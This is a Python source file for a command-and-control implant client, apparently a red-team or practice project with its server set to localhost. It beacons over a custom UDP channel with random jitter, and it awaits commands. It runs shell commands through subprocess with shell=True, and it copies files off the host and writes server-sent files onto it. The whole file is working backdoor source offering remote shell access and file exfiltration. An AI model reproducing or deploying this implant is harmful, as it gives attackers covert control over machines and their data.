import subprocess
import sys
import random
import struct

sys.path.insert(0, "./git-gud-udp")
from ggudp import GGUdp

# These are globals just for ease of editing the file / testing
# Connection time-out value. If this timeout is reached, falls back to initial callback
CALLOUT_TIMEOUT = 5

# Command and Control server
C2_ADDR = "127.0.0.1"
C2_PORT = 8000

# Use encryption. This argv is used for testing, just set to True or False
USE_ENCRYPTION = (len(sys.argv) > 1)
# print("Using encryption:", USE_ENCRYPTION)

# Initial callback jitter
CALLBACK_JITTER_MIN = 5
CALLBACK_JITTER_MAX = 20

class Client(object):
    def __init__(self, ip="127.0.0.1", port=8000, delaymin=5, delaymax=12):
        while True:
            try:
                self.s = GGUdp(ip, port)
                self.initial_callback(delaymin, delaymax)
                self.loop()
            except Exception as e:
                print(str(e))
    
    def initial_callback(self, delaymin, delaymax):
        # delay is how many seconds between callback attempts
        while True:
            delay = random.randint(delaymin, delaymax)
            beacon = struct.pack("I", random.randint(0, 0xffffffff))
            # print("[beacon]")
            self.s.send(beacon, USE_ENCRYPTION)
            response = self.s.recv(delay, USE_ENCRYPTION)
            if response:
                break
    
    def execute_command(self, command):
        ret = subprocess.check_output(command, shell=True)
        return ret
    
    def file_get(self, filename):
        with open(filename, "rb") as f:
            ret = f.read()
        return ret
    
    def file_put(self, filename, data):
        with open(filename, "wb") as f:
            f.write(data)
        return "done"
    
    def parse_command(self, data):
        # print("Received command]{}".format(repr(data[:100])))
        if data[0] == ord('!'): # This means execute
            res = self.execute_command(str(data[1:]))
        elif data[0] == ord('u'): # upload from server to client
            filename,data = data[1:].split("\x00",1)
            res = self.file_put(str(filename), data)
        elif data[0] == ord('d'): # download from client to server
            res = self.file_get(str(data[1:]))
        elif data[0] == ord('q'):
            sys.exit()
        else:
            res = "Unknown command"
        return res
    
    def loop(self):
        while True:
            # Receive data
            data = self.s.recv(CALLOUT_TIMEOUT, USE_ENCRYPTION)
            if not data:
                # If receive_data failed, fall back to beaconing (initial callback)
                # print("Did not receive command")
                break
            # Do something with data
            try:
                res = self.parse_command(data)
            except SystemExit:
                sys.exit()
            except:
                res = bytearray("fail")
            
            # Send response
            status = self.s.send(res, USE_ENCRYPTION)
            if not status:
                print("Failed to send response")

if __name__ == "__main__":
    s = Client(C2_ADDR, C2_PORT, CALLBACK_JITTER_MIN, CALLBACK_JITTER_MAX)
